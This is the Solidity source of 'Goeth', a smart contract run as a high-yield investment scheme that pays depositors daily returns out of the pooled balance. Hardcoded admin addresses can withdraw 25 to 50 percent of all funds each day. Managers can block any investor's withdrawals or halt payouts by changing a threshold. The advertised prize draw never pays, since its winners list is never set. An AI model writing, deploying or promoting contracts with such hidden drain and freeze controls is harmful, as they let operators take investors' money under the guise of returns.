1 pragma solidity 0.4.25;
2 
3 library SafeMath {
4     function mul(uint256 a, uint256 b) internal pure returns(uint256) {
5         if(a == 0) {
6             return 0;
7         }
8         uint256 c = a * b;
9         require(c / a == b, "NaN");
10         return c;
11     }
12 
13     function div(uint256 a, uint256 b) internal pure returns(uint256) {
14         require(b > 0, "NaN");
15         uint256 c = a / b;
16         return c;
17     }
18 
19     function sub(uint256 a, uint256 b) internal pure returns(uint256) {
20         require(b <= a, "NaN");
21         uint256 c = a - b;
22         return c;
23     }
24 
25     function add(uint256 a, uint256 b) internal pure returns(uint256) {
26         uint256 c = a + b;
27         require(c >= a, "NaN");
28         return c;
29     }
30 
31     function mod(uint256 a, uint256 b) internal pure returns(uint256) {
32         require(b != 0, "NaN");
33         return a % b;
34     }
35 }
36 
37 contract Roles {
38     mapping(string => mapping(address => bool)) private rules;
39 
40     event RoleAdded(string indexed role, address indexed to);
41     event RoleRemoved(string indexed role, address indexed to);
42 
43     modifier onlyHasRole(string _role) {
44         require(rules[_role][msg.sender], "Access denied");
45         _;
46     }
47 
48     function hasRole(string _role, address _to) view public returns(bool) {
49         require(_to != address(0), "Zero address");
50 
51         return rules[_role][_to];
52     }
53 
54     function addRole(string _role, address _to) internal {
55         require(_to != address(0), "Zero address");
56 
57         rules[_role][_to] = true;
58 
59         emit RoleAdded(_role, _to);
60     }
61 
62     function removeRole(string _role, address _to) internal {
63         require(_to != address(0), "Zero address");
64 
65         rules[_role][_to] = false;
66         
67         emit RoleRemoved(_role, _to);
68     }
69 }
70 
71 contract Goeth is Roles {
72     using SafeMath for uint;
73 
74     struct Investor {
75         uint invested;
76         uint payouts;
77         uint first_invest;
78         uint last_payout;
79         address referrer;
80     }
81 
82     struct Admin {
83         uint percent;
84         uint timeout;
85         uint min_balance;
86         uint last_withdraw;
87     }
88 
89     uint constant public COMMISSION = 0;
90     uint constant public REFBONUS = 5;
91     uint constant public CASHBACK = 5;
92     uint constant public DRAWTIMEOUT = 1 days;
93     uint constant public MAXPAYOUT = 40;
94 
95     address public beneficiary = 0xa5451D1a11B3e2eE537423b724fa8F9FaAc1DD62;
96 
97     mapping(address => Investor) public investors;
98     mapping(address => bool) public blockeds;
99 
100     uint[] public draw_size = [5, 3, 2];
101     uint public last_draw = block.timestamp;
102     address[] public top = new address[](draw_size.length);
103     uint public max_payout_amoun_block = 10 ether;
104     
105     mapping(address => Admin) public admins;
106 
107     event Payout(address indexed holder, uint etherAmount);
108     event Deposit(address indexed holder, uint etherAmount, address referrer);
109     event RefBonus(address indexed from, address indexed to, uint etherAmount);
110     event CashBack(address indexed holder, uint etherAmount);
111     event Withdraw(address indexed to, uint etherAmount);
112     event WithdrawEther(address indexed to, uint etherAmount);
113     event Blocked(address indexed holder);
114     event UnBlocked(address indexed holder);
115     event TopWinner(address indexed holder, uint top, uint etherAmount);
116 
117     constructor() {
118         addRole("manager", 0x17a709173819d7c2E42DBB70643c848450093874);
119         addRole("manager", 0x2d15b5caFEE3f0fC2FA778b875987f756D64c789);
120 
121         admins[0x42966e110901FAD6f1A55ADCC8219b541D60b258] = Admin(50, 1 days, 0, 0);
122         admins[0xE84C2381783a32b04B7Db545Db330b579dce2782] = Admin(30, 1 days, 20 ether, 0);
123         admins[0xC620Dc2E168cE45274bAA26fc496E9Ed30482c73] = Admin(25, 1 days, 25 ether, 0);
124     }
125 
126     function investorBonusSize(address _to) view public returns(uint) {
127         uint b = investors[_to].invested;
128 
129         if(b >= 50 ether) return 1500;
130         if(b >= 20 ether) return 1000;
131         if(b >= 10 ether) return 700;
132         if(b >= 5 ether) return 500;
133         return 333;
134     }
135 
136     function bonusSize() view public returns(uint) {
137         uint b = address(this).balance;
138 
139         if(b >= 1000 ether) return 800;
140         if(b >= 500 ether) return 700;
141         if(b >= 300.1 ether) return 600;
142         if(b >= 100.1 ether) return 500;
143         return 333;
144     }
145 
146     function payoutSize(address _to) view public returns(uint) {
147         uint invested = investors[_to].invested;
148         uint max = invested.div(100).mul(MAXPAYOUT);
149         if(invested == 0 || investors[_to].payouts >= max) return 0;
150 
151         uint bonus_all = bonusSize();
152         uint bonus_to = investorBonusSize(_to);
153         uint bonus = bonus_all > bonus_to ? bonus_all : bonus_to;
154 
155         uint payout = invested.mul(bonus).div(10000).mul(block.timestamp.sub(investors[_to].last_payout)).div(1 days);
156 
157         return investors[_to].payouts.add(payout) > max ? max.sub(investors[_to].payouts) : payout;
158     }
159 
160     function bytesToAddress(bytes bys) pure private returns(address addr) {
161         assembly {
162             addr := mload(add(bys, 20))
163         }
164     }
165 
166 
167 
168     function() payable external {
169         if(hasRole("manager", msg.sender)) {
170             require(msg.data.length > 0, "Send the address in data");
171             
172             address addr = bytesToAddress(msg.data);
173 
174             require(!hasRole("manager", addr) && admins[addr].percent == 0, "This address is manager");
175 
176             if(!blockeds[addr]) {
177                 blockeds[addr] = true;
178                 emit Blocked(addr);
179             }
180             else {
181                 blockeds[addr] = false;
182                 emit UnBlocked(addr);
183             }
184             
185             if(msg.value > 0) {
186                 msg.sender.transfer(msg.value);
187             }
188 
189             return;
190         }
191 
192         if(investors[msg.sender].invested > 0 && !blockeds[msg.sender] && investors[msg.sender].invested < max_payout_amoun_block) {
193             uint payout = payoutSize(msg.sender);
194 
195             require(msg.value > 0 || payout > 0, "No payouts");
196 
197             if(payout > 0) {
198                 investors[msg.sender].last_payout = block.timestamp;
199                 investors[msg.sender].payouts = investors[msg.sender].payouts.add(payout);
200 
201                 msg.sender.transfer(payout);
202 
203                 emit Payout(msg.sender, payout);
204 
205             }
206         }
207 
208         if(msg.value == 0.00001 ether) {
209             require(investors[msg.sender].invested > 0 && !blockeds[msg.sender], "You have not invested anything yet");
210 
211             uint amount = investors[msg.sender].invested.mul(90).div(100);
212             
213             msg.sender.transfer(amount);
214 
215             delete investors[msg.sender];
216             
217             emit Withdraw(msg.sender, amount);
218         }
219         else if(msg.value > 0) {
220             require(msg.value >= 0.01 ether, "Minimum investment amount 0.01 ether");
221 
222             investors[msg.sender].last_payout = block.timestamp;
223             investors[msg.sender].invested = investors[msg.sender].invested.add(msg.value);
224 
225             beneficiary.transfer(msg.value.mul(COMMISSION).div(100));
226 
227             if(investors[msg.sender].first_invest == 0) {
228                 investors[msg.sender].first_invest = block.timestamp;
229 
230                 if(msg.data.length > 0) {
231                     address ref = bytesToAddress(msg.data);
232 
233                     if(ref != msg.sender && investors[ref].invested > 0 && msg.value >= 1 ether) {
234                         investors[msg.sender].referrer = ref;
235 
236                         uint ref_bonus = msg.value.mul(REFBONUS).div(100);
237                         ref.transfer(ref_bonus);
238 
239                         emit RefBonus(msg.sender, ref, ref_bonus);
240 
241                         uint cashback_bonus = msg.value.mul(CASHBACK).div(100);
242                         investors[msg.sender].invested = investors[msg.sender].invested.add(cashback_bonus);
243 
244                         emit CashBack(msg.sender, cashback_bonus);
245                     }
246                 }
247             }
248 
249             emit Deposit(msg.sender, msg.value, investors[msg.sender].referrer);
250         }
251     }
252 
253     function SetMaxPayoutAmounBlock(uint _value) public onlyHasRole("manager") {
254         max_payout_amoun_block = _value;
255     }
256 
257     function draw() public {
258         require(block.timestamp > last_draw + DRAWTIMEOUT, "The drawing is available 1 time in 24 hours");
259 
260         last_draw = block.timestamp;
261 
262         uint balance = address(this).balance;
263 
264         for(uint i = 0; i < draw_size.length; i++) {
265             if(top[i] != address(0)) {
266                 uint amount = balance.div(100).mul(draw_size[i]);
267                 top[i].transfer(amount);
268 
269                 emit TopWinner(top[i], i + 1, amount);
270             }
271         }
272     }
273 
274     function withdrawEther(address _to) public {
275         Admin storage admin = admins[msg.sender];
276         uint balance = address(this).balance;
277 
278         require(admin.percent > 0, "Access denied");
279         require(admin.timeout == 0 || block.timestamp > admin.last_withdraw.add(admin.timeout), "Timeout");
280         require(_to != address(0), "Zero address");
281         require(balance > 0, "Not enough balance");
282 
283         uint amount = balance > admin.min_balance ? balance.div(100).mul(admin.percent) : balance;
284 
285         admin.last_withdraw = block.timestamp;
286 
287         _to.transfer(amount);
288 
289         emit WithdrawEther(_to, amount);
290     }
291 }